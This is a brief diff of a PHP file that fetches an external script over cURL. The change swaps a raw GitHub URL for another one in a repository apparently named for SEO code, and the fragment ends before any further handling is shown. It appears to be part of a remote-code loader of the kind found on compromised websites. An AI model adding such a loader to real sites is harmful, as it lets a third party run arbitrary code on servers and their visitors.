@@ -1,6 +1,6 @@
 <?php
 // URL untuk mengambil skrip eksternal
-$url = "https://raw.githubusercontent.com/Zeddgansz/Alattempur/main/b.php";
+$url = "https://raw.githubusercontent.com/Zeddgansz/codeseo/main/14-08-2024";
 
 // Opsi cURL
 $options = [
